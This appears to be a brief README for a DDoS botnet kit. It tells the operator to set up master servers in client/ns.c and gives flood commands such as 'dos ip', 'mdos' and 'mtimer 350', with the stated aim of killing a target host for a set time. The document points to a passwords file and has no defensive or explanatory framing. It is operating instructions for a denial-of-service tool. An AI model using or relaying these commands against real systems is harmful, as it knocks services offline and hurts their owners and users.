edit client/ns.c
search for
MASTER
and setup your own masters server, add the ips there
.............
NEVER do
dos hostname
mdos hostname:blah:blah
ALWAYS USE IPS
and
there is NO mstop command(working on it though)
so
use timers
mtimer 350
dos ip
will kill it for 350 secs
bye
read 'password' for passes
